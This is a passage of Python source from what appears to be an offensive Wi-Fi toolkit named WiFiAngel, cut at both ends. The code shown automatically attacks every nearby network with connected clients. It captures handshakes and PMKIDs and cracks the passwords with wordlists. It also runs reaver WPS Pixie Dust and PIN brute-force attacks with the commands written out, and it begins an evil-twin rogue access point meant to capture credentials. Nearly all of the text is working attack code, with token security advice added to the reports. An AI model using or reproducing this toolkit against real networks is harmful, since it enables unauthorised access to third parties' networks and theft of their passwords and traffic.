                    
                    # Only include networks with clients
                    if validated_network['clients']:
                        networks_with_clients.append((bssid, validated_network))
                        self.logger.debug(f"Validated network data for {validated_network['ssid']} ({bssid})")
                    else:
                        self.logger.debug(f"Skipping network {validated_network['ssid']} ({bssid}): no clients")
                        
                except Exception as e:
                    self.logger.error(f"Error validating network {bssid}: {str(e)}")
                    continue
            
            if not networks_with_clients:
                self.console.print("[bold red]❌ No networks found with connected clients! Attack requires active clients.[/]")
                self.logger.error("No networks with connected clients")
                with open(report_file, "a") as f:
                    f.write("ERROR: No networks with connected clients found\n")
                self._auto_hack_cleanup()
                return
            
            self.console.print(f"[bold green]Found {len(networks_with_clients)} networks with active clients.[/]")
            self.logger.info(f"Found {len(networks_with_clients)} networks with active clients")
            
            # Log validated networks
            with open(report_file, "a") as f:
                f.write("\nValidated Networks:\n")
                for bssid, network in networks_with_clients:
                    f.write(f"- {network['ssid']} ({bssid}):\n")
                    f.write(f"  Channel: {network['channel']}\n")
                    f.write(f"  Security: {network['cipher']}\n")
                    f.write(f"  Clients: {len(network['clients'])}\n")
                    f.write(f"  Signal: {network['signal']}\n\n")
                
            # Create results table
            results_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Attack Results[/]")
            results_table.add_column("Network", style="cyan")
            results_table.add_column("Status", style="yellow", width=40)
            results_table.add_column("Handshake", style="green")
            results_table.add_column("PMKID", style="blue")
            results_table.add_column("Password", style="magenta")
            
            # Check for wordlist
            wordlist = str(DEFAULT_WORDLIST)
            if not os.path.exists(wordlist):
                wordlist_alt = str(ROCKYOU_WORDLIST)
                if os.path.exists(wordlist_alt):
                    wordlist = wordlist_alt
                    self.console.print(
                        f"[bold yellow]⚠️ Default wordlist not found, using {wordlist_alt} instead.[/]"
                    )
                    self.logger.warning(f"Default wordlist not found, using {wordlist_alt} instead")
                else:
                    self.console.print(f"[bold red]❌ No default wordlists found![/]")
                    wordlist = Prompt.ask("[bold yellow]Please enter the path to a wordlist file (or press Enter to skip)")
                    if not wordlist or not os.path.exists(wordlist):
                        self.console.print("[bold red]❌ No valid wordlist provided. Exiting auto hack...[/]")
                        self.logger.error("No valid wordlist provided, exiting auto hack")
                        self._auto_hack_cleanup()
                        return
                
            # Parallel processing settings
            max_parallel_attacks = min(4, len(networks_with_clients))  # Up to 4 parallel attacks
            self.console.print(f"[bold blue]4. Starting Parallel Attacks on {len(networks_with_clients)} networks (max {max_parallel_attacks} at once)...[/]")
            
            # Process networks in chunks for parallel execution
            attack_results = []
            
            # Add progress bar for tracking attack progress
            progress = Progress(
                "[progress.description]{task.description}",
                BarColumn(),
                "[progress.percentage]{task.percentage:>3.0f}%",
                TimeRemainingColumn(),
                console=self.console
            )
            
            # Start progress display
            with progress:
                task = progress.add_task("[cyan]Processing networks...", total=len(networks_with_clients))
                
                # Create thread pool
                executor = ThreadPoolExecutor(max_workers=max_parallel_attacks)
                future_to_network = {}
                
                try:
                    # Submit all tasks
                    for bssid, validated_net in networks_with_clients:
                        future = executor.submit(self._auto_hack_single_network, bssid, validated_net, session_dir, wordlist)
                        future_to_network[future] = (bssid, validated_net)
                    
                    # Process completed tasks and update progress
                    for future in concurrent.futures.as_completed(future_to_network):
                        bssid, network = future_to_network[future]
                        try:
                            result = future.result()
                            attack_results.append((bssid, network, result))
                            
                            # Update table
                            results_table.add_row(
                                network['ssid'],
                                result['status_message'],
                                result['handshake_status'],
                                result['pmkid_status'],
                                result['password'] if result['password'] else ""
                            )
                        except Exception as e:
                            self.logger.error(f"Error during auto hack of {network['ssid']}: {str(e)}")
                            result = {
                                'status_message': f"[bold red]✗ Error: {str(e)}[/]",
                                'handshake_status': "[red]✗ Failed",
                                'pmkid_status': "[red]✗ Failed",
                                'password': None,
                                'handshake_file': None,
                                'pmkid_file': None
                            }
                            attack_results.append((bssid, network, result))
                            results_table.add_row(
                                network['ssid'],
                                result['status_message'],
                                result['handshake_status'],
                                result['pmkid_status'],
                                ""
                            )
                        
                        # Update progress for each completed network regardless of success or failure
                        progress.update(task, advance=1, description=f"[cyan]Processed {network['ssid']}")
                
                except KeyboardInterrupt:
                    self.console.print("\n[bold yellow]⚠️ Auto Hack stopped by user.[/]")
                    self.logger.warning("Auto Hack stopped by user")
                    # Cancel all running futures
                    for future in future_to_network:
                        future.cancel()
                    # Shutdown executor immediately
                    executor.shutdown(wait=False, cancel_futures=True)
                    self.scanning = False
                    self._auto_hack_cleanup()
                    self.current_menu = "main"
                    return
                finally:
                    # Ensure executor is properly shutdown
                    executor.shutdown(wait=False, cancel_futures=True)
            
            # Display final results
            self.console.print("\n")
            self.console.print(results_table)
            
            # Analyze results
            handshakes_captured = sum(1 for _, _, result in attack_results if "[green]✓ Captured" in result['handshake_status'])
            pmkids_captured = sum(1 for _, _, result in attack_results if "[green]✓ Captured" in result['pmkid_status'])
            passwords_found = sum(1 for _, _, result in attack_results if result['password'])
            
            # Generate comprehensive analysis and recommendations
            self.console.print("\n[bold blue]5. Attack Result Analysis[/]")
            analysis_table = Table(show_header=True, header_style="bold blue", title="[bold green]Analysis Summary[/]")
            analysis_table.add_column("Metric", style="cyan")
            analysis_table.add_column("Value", style="yellow")
            analysis_table.add_column("Success Rate", style="green")
            
            total_networks = len(networks_with_clients)
            analysis_table.add_row(
                "Networks Attacked", 
                str(total_networks),
                "100%"
            )
            analysis_table.add_row(
                "Handshakes Captured", 
                str(handshakes_captured),
                f"{handshakes_captured/total_networks*100:.1f}%" if total_networks > 0 else "0%"
            )
            analysis_table.add_row(
                "PMKIDs Captured", 
                str(pmkids_captured),
                f"{pmkids_captured/total_networks*100:.1f}%" if total_networks > 0 else "0%"
            )
            analysis_table.add_row(
                "Passwords Cracked", 
                str(passwords_found),
                f"{passwords_found/total_networks*100:.1f}%" if total_networks > 0 else "0%"
            )
            
            self.console.print(analysis_table)
            
            # Generate security recommendations
            security_panel = Panel(
                "[yellow]Network Security Analysis[/]\n\n" +
                (f"[green]✓ Cracked {passwords_found} passwords out of {total_networks} networks.[/]\n\n" if passwords_found > 0 else "[red]✗ No passwords were cracked.[/]\n\n") +
                "[yellow]Security Recommendations:[/]\n" +
                "- [cyan]Use WPA3 encryption when available for better security.[/]\n" +
                "- [cyan]Use complex, randomly generated passwords (20+ characters).[/]\n" +
                "- [cyan]Use unique passwords for each network.[/]\n" +
                "- [cyan]Disable WPS as it can be vulnerable to attacks.[/]\n" +
                "- [cyan]Consider implementing MAC address filtering as an extra layer.[/]\n" +
                "- [cyan]Enable network logging to detect attack attempts.[/]\n\n" +
                "[yellow]Security Statistics:[/]\n" +
                f"- [cyan]Networks with vulnerable security (WEP/WPA): {sum(1 for _, network, _ in attack_results if 'WEP' in network['cipher'] or ('WPA' in network['cipher'] and 'WPA2' not in network['cipher'] and 'WPA3' not in network['cipher']))}/{total_networks}[/]\n" +
                f"- [cyan]Networks with recommended security (WPA3): {sum(1 for _, network, _ in attack_results if 'WPA3' in network['cipher'])}/{total_networks}[/]\n",
                title="[bold magenta]Security Analysis & Recommendations[/]",
                border_style="blue"
            )
            
            self.console.print(security_panel)
        
            # Save comprehensive report
            end_time = datetime.now()
            self.logger.info(f"Auto Hack completed at {end_time}")
            with open(report_file, "a") as f:
                f.write(f"End Time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Duration: {(end_time - datetime.strptime(session_timestamp, '%Y%m%d_%H%M%S')).total_seconds():.2f} seconds\n\n")
                f.write("==================\n")
                f.write("SUMMARY RESULTS\n")
                f.write("==================\n")
                f.write(f"Networks Attacked: {total_networks}\n")
                f.write(f"Handshakes Captured: {handshakes_captured}\n")
                f.write(f"PMKIDs Captured: {pmkids_captured}\n")
                f.write(f"Passwords Cracked: {passwords_found}\n\n")
                
                # Write security analysis
                f.write("==================\n")
                f.write("SECURITY ANALYSIS\n")
                f.write("==================\n")
                f.write(f"Networks with vulnerable security (WEP/WPA): {sum(1 for _, network, _ in attack_results if 'WEP' in network['cipher'] or ('WPA' in network['cipher'] and 'WPA2' not in network['cipher'] and 'WPA3' not in network['cipher']))}/{total_networks}\n")
                f.write(f"Networks with recommended security (WPA3): {sum(1 for _, network, _ in attack_results if 'WPA3' in network['cipher'])}/{total_networks}\n\n")
                
                # Write recommendations
                f.write("==================\n")
                f.write("RECOMMENDATIONS\n")
                f.write("==================\n")
                f.write("Security Recommendations:\n")
                f.write("- Use WPA3 encryption when available for better security.\n")
                f.write("- Use complex, randomly generated passwords (20+ characters).\n")
                f.write("- Use unique passwords for each network.\n")
                f.write("- Disable WPS as it can be vulnerable to attacks.\n")
                f.write("- Consider implementing MAC address filtering as an extra layer.\n")
                f.write("- Enable network logging to detect attack attempts.\n\n")
                
                # Write follow-up steps
                f.write("==================\n")
                f.write("FOLLOW-UP STEPS\n")
                f.write("==================\n")
                if passwords_found > 0:
                    f.write("- The discovered passwords should be disclosed to network owners for security improvement.\n")
                    f.write("- Networks with cracked passwords should update their security configurations immediately.\n")
                if handshakes_captured > 0 and passwords_found < handshakes_captured:
                    f.write("- Additional cracking attempts with larger dictionaries can be performed offline.\n")
                    f.write("- Consider using more powerful hardware for offline cracking.\n")
                f.write("- Regular security audits should be performed to ensure continued network safety.\n")
            
            # Create an HTML report with more details and visual elements
            html_report_file = session_dir / "auto_hack_report.html"
            self._generate_html_report(session_dir, attack_results, html_report_file)
                
            self.console.print(f"\n[bold green]✅ Auto Hack completed! Detailed reports saved to:[/]")
            self.console.print(f"[bold cyan]  - Text Report: {report_file}[/]")
            self.console.print(f"[bold cyan]  - HTML Report: {html_report_file}[/]")
            
        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]⚠️ Auto Hack stopped by user.[/]")
            self.logger.warning("Auto Hack stopped by user")
            self.scanning = False
            self._auto_hack_cleanup()
            self.current_menu = "main"
            return
        except Exception as e:
            self.console.print(f"[bold red]❌ Error during Auto Hack: {str(e)}[/]")
            self.logger.error(f"Error during Auto Hack: {str(e)}")
            with open(report_file, "a") as f:
                f.write(f"\nERROR: {str(e)}\n")
            self.scanning = False
        finally:
            # Execute safe cleanup
            self.console.print("[bold blue]Performing cleanup...[/]")
            self._auto_hack_cleanup()
            self.current_menu = "main"
            return
    
    def _generate_html_report(self, session_dir, attack_results, html_report_file):
        """Generate an HTML report with attack results"""
        try:
            # Calculate statistics
            total_networks = len(attack_results)
            handshakes_captured = sum(1 for _, _, result in attack_results if "[green]✓ Captured" in result['handshake_status'])
            pmkids_captured = sum(1 for _, _, result in attack_results if "[green]✓ Captured" in result['pmkid_status'])
            passwords_found = sum(1 for _, _, result in attack_results if result['password'])
            vulnerable_networks = sum(1 for _, network, _ in attack_results if 'WEP' in network['cipher'] or ('WPA' in network['cipher'] and 'WPA2' not in network['cipher'] and 'WPA3' not in network['cipher']))
            wpa3_networks = sum(1 for _, network, _ in attack_results if 'WPA3' in network['cipher'])
            
            # Generate table rows for attack results
            attack_results_rows = ""
            for bssid, network, result in attack_results:
                handshake_status = "✓ Captured" if "[green]✓ Captured" in result['handshake_status'] else "✗ Failed"
                handshake_class = "success" if "[green]✓ Captured" in result['handshake_status'] else "error"
                
                pmkid_status = "✓ Captured" if "[green]✓ Captured" in result['pmkid_status'] else "✗ Failed"
                pmkid_class = "success" if "[green]✓ Captured" in result['pmkid_status'] else "error"
                
                password = result['password'] if result['password'] else "Not found"
                password_class = "success" if result['password'] else "warning"
                
                attack_results_rows += f"""<tr>
            <td>{network['ssid']}</td>
            <td>{bssid}</td>
            <td>{network['cipher']}</td>
            <td class="{handshake_class}">{handshake_status}</td>
            <td class="{pmkid_class}">{pmkid_status}</td>
            <td class="{password_class}">{password}</td>
        </tr>"""
            
            # Generate follow-up steps based on results
            followup_steps = ""
            if passwords_found > 0:
                followup_steps += "<li>The discovered passwords should be disclosed to network owners for security improvement.</li>"
                followup_steps += "<li>Networks with cracked passwords should update their security configurations immediately.</li>"
            if handshakes_captured > 0 and passwords_found < handshakes_captured:
                followup_steps += "<li>Additional cracking attempts with larger dictionaries can be performed offline.</li>"
                followup_steps += "<li>Consider using more powerful hardware for offline cracking.</li>"
            followup_steps += "<li>Regular security audits should be performed to ensure continued network safety.</li>"
            
            # Fill in template variables
            now = datetime.now()
            session_start_time = datetime.strptime(session_dir.name.split("/")[-1], "%Y%m%d_%H%M%S")
            duration = (now - session_start_time).total_seconds()
            
            # Create simplified HTML with inline CSS
            html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFiAngel Auto Hack Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 1200px; margin: 0 auto; padding: 20px; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        h1 {{ border-bottom: 2px solid #3498db; padding-bottom: 10px; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ padding: 12px 15px; border: 1px solid #ddd; text-align: left; }}
        th {{ background-color: #3498db; color: white; }}
        tr:nth-child(even) {{ background-color: #f2f2f2; }}
        .success {{ color: #27ae60; font-weight: bold; }}
        .warning {{ color: #f39c12; font-weight: bold; }}
        .error {{ color: #e74c3c; font-weight: bold; }}
        .summary-box {{ background-color: #ecf0f1; border-left: 5px solid #3498db; padding: 15px; margin: 20px 0; }}
        .recommendations {{ background-color: #e8f4fd; border-left: 5px solid #2980b9; padding: 15px; margin: 20px 0; }}
        .chart-container {{ max-width: 600px; margin: 20px auto; }}
    </style>
</head>
<body>
    <h1>WiFiAngel Auto Hack Report</h1>
    <div class="summary-box">
        <h2>Session Summary</h2>
        <p><strong>Date:</strong> {now.strftime("%Y-%m-%d")}</p>
        <p><strong>Start Time:</strong> {session_start_time.strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p><strong>End Time:</strong> {now.strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p><strong>Duration:</strong> {duration:.2f} seconds</p>
        <p><strong>Networks Scanned:</strong> {len(self.networks)}</p>
        <p><strong>Networks Attacked:</strong> {total_networks}</p>
    </div>
    
    <h2>Attack Results</h2>
    <table>
        <tr>
            <th>Network</th>
            <th>BSSID</th>
            <th>Security</th>
            <th>Handshake</th>
            <th>PMKID</th>
            <th>Password</th>
        </tr>
        {attack_results_rows}
    </table>
    
    <h2>Statistics</h2>
    <div class="summary-box">
        <p><strong>Handshakes Captured:</strong> {handshakes_captured} / {total_networks} ({(handshakes_captured/total_networks*100) if total_networks > 0 else 0:.1f}%)</p>
        <p><strong>PMKIDs Captured:</strong> {pmkids_captured} / {total_networks} ({(pmkids_captured/total_networks*100) if total_networks > 0 else 0:.1f}%)</p>
        <p><strong>Passwords Cracked:</strong> {passwords_found} / {total_networks} ({(passwords_found/total_networks*100) if total_networks > 0 else 0:.1f}%)</p>
    </div>
    
    <h2>Security Analysis</h2>
    <div class="summary-box">
        <p><strong>Networks with vulnerable security (WEP/WPA):</strong> {vulnerable_networks} / {total_networks}</p>
        <p><strong>Networks with recommended security (WPA3):</strong> {wpa3_networks} / {total_networks}</p>
    </div>
    
    <h2>Recommendations</h2>
    <div class="recommendations">
        <ul>
            <li>Use WPA3 encryption when available for better security.</li>
            <li>Use complex, randomly generated passwords (20+ characters).</li>
            <li>Use unique passwords for each network.</li>
            <li>Disable WPS as it can be vulnerable to attacks.</li>
            <li>Consider implementing MAC address filtering as an extra layer.</li>
            <li>Enable network logging to detect attack attempts.</li>
        </ul>
    </div>
    
    <h2>Follow-up Steps</h2>
    <div class="recommendations">
        <ul>
            {followup_steps}
        </ul>
    </div>
    
    <footer>
        <p>Generated by WiFiAngel on {now.strftime("%Y-%m-%d")}</p>
    </footer>
</body>
</html>"""
            
            # Write HTML content to file
            with open(html_report_file, "w") as f:
                f.write(html_content)
                
            self.logger.info(f"HTML report generated at {html_report_file}")
            
        except Exception as e:
            self.logger.error(f"Error generating HTML report: {str(e)}")
            # Continue execution, don't let report generation failure stop the program

    def cleanup_and_exit(self):
        """Performs cleanup before exiting"""
        self.scanning = False
        self.console.print("[bold yellow]Performing cleanup...[/]")
        self.logger.info("Cleanup process started")
        
        try:
            # Close monitor mode
            subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.PIPE)
            self.logger.info(f"{self.interface_name} switched to managed mode")
            time.sleep(1)
            
            # Start NetworkManager
            subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.PIPE)
            self.logger.info("NetworkManager started")
            
            self.console.print("[bold green]Cleanup completed.[/]")
            self.logger.info("Cleanup completed")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {str(e)}")
            self.console.print(f"[bold red]Error during cleanup: {str(e)}[/]")
        
        sys.exit(0)

    def run(self):
        """Main program loop"""
        try:
            while True:
                try:
                    self.show_main_menu()
                except KeyboardInterrupt:
                    if self.current_menu == "main":
                        self.logger.info("Program shutting down...")
                        self.cleanup_and_exit()
                    else:
                        self.logger.info("Returning to main menu")
                        self.console.print("\n[bold yellow]Returning to main menu...[/]")
                        self.current_menu = "main"
                        continue
        except Exception as e:
            self.logger.error(f"Unexpected error: {str(e)}")
            self.cleanup_and_exit()

    def show_network_stats(self):
        """Shows detailed network statistics"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Network Statistics[/]")
        table.add_column("Network", style="cyan")
        table.add_column("Channel", style="green")
        table.add_column("Security", style="yellow")
        table.add_column("Signal", style="blue")
        table.add_column("Clients", style="magenta")
        table.add_column("Data Packets", style="cyan")
        table.add_column("First Seen", style="green")
        table.add_column("Last Seen", style="yellow")

        for bssid, network in self.networks.items():
            table.add_row(
                network['ssid'],
                str(network['channel']),
                network['cipher'],
                str(network['signal']),
                str(len(network['clients'])),
                str(network['data_packets']),
                network['first_seen'].strftime("%H:%M:%S"),
                network['last_seen'].strftime("%H:%M:%S")
            )

        self.console.print(table)

    def client_analysis(self):
        """Analyzes connected clients"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Client Analysis[/]")
        table.add_column("Client MAC", style="cyan")
        table.add_column("Connected To", style="green")
        table.add_column("Network Security", style="yellow")
        table.add_column("Data Packets", style="blue")

        for bssid, network in self.networks.items():
            for client in network['clients']:
                table.add_row(
                    client,
                    network['ssid'],
                    network['cipher'],
                    str(network['data_packets'])
                )

        self.console.print(table)

    def wps_attack(self):
        """Performs WPS attack using Pixie Dust and brute force methods"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return

        network = self.networks[self.selected_network]
        
        if not network['wps']:
            self.console.print("[bold red]Selected network does not have WPS enabled![/]")
            return

        self.console.print("\n[bold yellow]WPS Attack:[/]")
        self.console.print("1. 🎯 Pixie Dust Attack")
        self.console.print("2. 🔨 PIN Brute Force")
        self.console.print("0. ↩️ Back")
        
        choice = Prompt.ask("Select an option")
        
        if choice == "0":
            return
            
        try:
            if choice == "1":
                self.console.print("[bold blue]Starting Pixie Dust attack...[/]")
                cmd = f"reaver -i {self.interface_name} -b {self.selected_network} -c {network['channel']} -K 1 -vv"
            else:
                self.console.print("[bold blue]Starting PIN brute force...[/]")
                cmd = f"reaver -i {self.interface_name} -b {self.selected_network} -c {network['channel']} -vv"

            process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            
            with Live(refresh_per_second=4) as live:
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        # Create status table
                        table = Table(show_header=True, header_style="bold magenta")
                        table.add_column("Network", style="cyan")
                        table.add_column("Status", style="yellow")
                        table.add_row(network['ssid'], output.strip())
                        live.update(table)
                        
                        if "WPS PIN:" in output:
                            pin = output.split("WPS PIN:")[1].strip()
                            self.console.print(f"\n[bold green]✓ WPS PIN found: {pin}[/]")
                            break
                        elif "WPA PSK:" in output:
                            password = output.split("WPA PSK:")[1].strip()
                            self.console.print(f"\n[bold green]✓ WPA Password found: {password}[/]")
                            break

        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]WPS attack stopped by user.[/]")
        finally:
            if 'process' in locals():
                try:
                    process.terminate()
                    process.wait(timeout=2)
                except:
                    process.kill()
            # Ensure menu state is properly reset
            self.current_menu = "attack"

    def evil_twin_attack(self):
        """Creates an Evil Twin access point to capture credentials"""
        # Store original network settings
        original_settings = {}
        original_interface_name = self.interface_name  # Store original interface name
        
        # Clear any existing client data and cache
        try:
            # Clear dnsmasq leases file
            subprocess.run(["rm", "-f", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Create empty dnsmasq.leases file and set permissions
            try:
                with open("/var/lib/misc/dnsmasq.leases", 'w') as f:
                    pass  # Create empty file
                # Set proper permissions
                subprocess.run(["chmod", "644", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # Ensure dnsmasq can access the file
                dnsmasq_dir = Path("/var/lib/misc")
                if not dnsmasq_dir.exists():
                    dnsmasq_dir.mkdir(parents=True, exist_ok=True)
                    subprocess.run(["chmod", "755", str(dnsmasq_dir)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                self.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(e)}")
            # Clear any existing evil twin logs
            evil_twin_dir = self.logger.log_dir / "evil_twin"
            if evil_twin_dir.exists():
                for file in evil_twin_dir.glob("*"):
                    try:
                        file.unlink()
                    except:
                        pass
        except Exception as e:
            self.logger.log_evil_twin(f"Warning: Could not clear previous cache: {str(e)}")

        try:
            # Get original network settings
            self.console.print("[bold blue]Saving original network settings...[/]")
            original_settings['ip_forward'] = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"]).decode().strip()
            original_settings['interface_state'] = subprocess.check_output(["ip", "addr", "show", self.interface_name]).decode()
            original_settings['route_table'] = subprocess.check_output(["ip", "route", "show"]).decode()
            original_settings['iptables'] = subprocess.check_output(["iptables-save"]).decode()
            original_settings['resolved_status'] = subprocess.run(["systemctl", "is-active", "systemd-resolved"], 
                                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
            original_settings['network_manager_status'] = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
            original_settings['wpa_supplicant_status'] = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
                                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
            
            # Save WiFi connection info if available
            try:
                original_settings['wifi_connections'] = subprocess.check_output(["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"]).decode()
            except:
                original_settings['wifi_connections'] = ""

            # Get network info
            default_ssid = ""
            default_channel = "1"
            if self.selected_network:
                network = self.networks[self.selected_network]
                default_ssid = network['ssid']
                default_channel = str(network['channel'])
                self.console.print(f"\n[bold yellow]Selected network: {default_ssid} (Channel: {default_channel})[/]")
            
            
            # Ask for SSID (with default if network is selected)
            ssid = Prompt.ask("Enter SSID for the Evil Twin", default=default_ssid)
            if not ssid and default_ssid:
                ssid = default_ssid
                self.console.print(f"[bold cyan]Using selected network SSID: {ssid}[/]")
            
            # Ask for channel (with default if network is selected)
            channel_input = Prompt.ask("Enter channel (1-11)", default=default_channel)
            try:
                channel = int(channel_input)
                if channel < 1 or channel > 11:
                    self.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
                    channel = 1
            except:
                self.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
                channel = 1
        
            # Ask for WPA2-PSK configuration
            use_wpa2 = Prompt.ask("Enable WPA2-PSK security? (y/n)", choices=["y", "n"]) == "y"
            if use_wpa2:
                wpa_passphrase = Prompt.ask("Enter WPA2 passphrase (8-63 characters)")
                if len(wpa_passphrase) < 8 or len(wpa_passphrase) > 63:
                    self.console.print("[bold red]Invalid passphrase length! Using default: 12345678[/]")
                    wpa_passphrase = "12345678"
        
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Log Evil Twin attack start
            self.logger.log_evil_twin("Attack started", ssid=ssid, channel=channel, security="WPA2" if use_wpa2 else "Open")
            
            # Create necessary directories
            log_dir = self.logger.log_dir / "evil_twin"
            log_dir.mkdir(exist_ok=True)
            
            # Create hostapd configuration
            hostapd_conf = f"""interface={self.interface_name}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
ieee80211n=1
ht_capab=[HT40+][SHORT-GI-40][DSSS_CCK-40]"""

            if use_wpa2:
                hostapd_conf += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase={wpa_passphrase}
wpa_pairwise=CCMP
rsn_pairwise=CCMP"""

            # Create dnsmasq configuration
            dnsmasq_conf = f"""interface={self.interface_name}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
log-queries
log-dhcp
log-facility={log_dir}/dnsmasq.log
log-async=20
listen-address=192.168.1.1
bind-interfaces
no-resolv
server=8.8.8.8
server=8.8.4.4
dhcp-leasefile={log_dir}/dnsmasq.leases"""

            # Stop network services
            self.console.print("[bold blue]Preparing network environment...[/]")
            self.logger.log_evil_twin("Stopping network services")
            subprocess.run(["systemctl", "stop", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["systemctl", "stop", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["killall", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["killall", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)

            # Configure interface
            self.console.print("[bold blue]Configuring network interface...[/]")
            self.logger.log_evil_twin("Configuring network interface")
            subprocess.run(["rfkill", "unblock", "all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "flush", "dev", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)

            # Write configurations
            hostapd_path = log_dir / "hostapd.conf"
            dnsmasq_path = log_dir / "dnsmasq.conf"
            
            with open(hostapd_path, "w") as f:
                f.write(hostapd_conf)
            with open(dnsmasq_path, "w") as f:
                f.write(dnsmasq_conf)

            # Start Evil Twin AP
            self.console.print("[bold blue]Starting Evil Twin access point...[/]")
            self.logger.log_evil_twin("Starting access point")
            hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(3)
            
            # Check if hostapd started successfully
            if hostapd_proc.poll() is not None:
                self.logger.log_evil_twin("Failed to start hostapd", error=True)
                raise Exception("Failed to start hostapd. Check your wireless adapter.")
            
            # Start DHCP server
            self.logger.log_evil_twin("Starting DHCP server")
            dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(2)
            
            if dnsmasq_proc.poll() is not None:
                self.logger.log_evil_twin("Failed to start dnsmasq", error=True)
                raise Exception("Failed to start dnsmasq. Check configuration.")

            # Enable IP forwarding
            subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Configure iptables
            self.logger.log_evil_twin("Configuring iptables")
            subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", self.interface_name, "-j", "MASQUERADE"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-A", "FORWARD", "-i", self.interface_name, "-j", "ACCEPT"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            dnsmasq_log = log_dir / "dnsmasq.log"
            if not dnsmasq_log.exists():
                dnsmasq_log.touch()

            with Live(refresh_per_second=4) as live:
                start_time = time.time()
                clients_connected = {}  # Reset clients dictionary
                dns_queries = []
                tcp_connections = []
                
                # Create cache directory for this session
                cache_dir = Path("/tmp/wifiangel_evil_twin")
                cache_dir.mkdir(exist_ok=True)
                session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
                session_file = cache_dir / f"clients_{session_id}.json"
                
                # Clear any existing dnsmasq leases
                leases_file = log_dir / "dnsmasq.leases"
                
                # Create empty dnsmasq.leases file and set permissions
                try:
                    # Ensure file exists
                    leases_file.touch(exist_ok=True)
                    # Set proper permissions
                    subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception as e:
                    self.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(e)}")

                while True:
                    # Create main status table
                    status_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Evil Twin Status[/]")
                    status_table.add_column("Evil Twin SSID", style="cyan")
                    status_table.add_column("Channel", style="green")
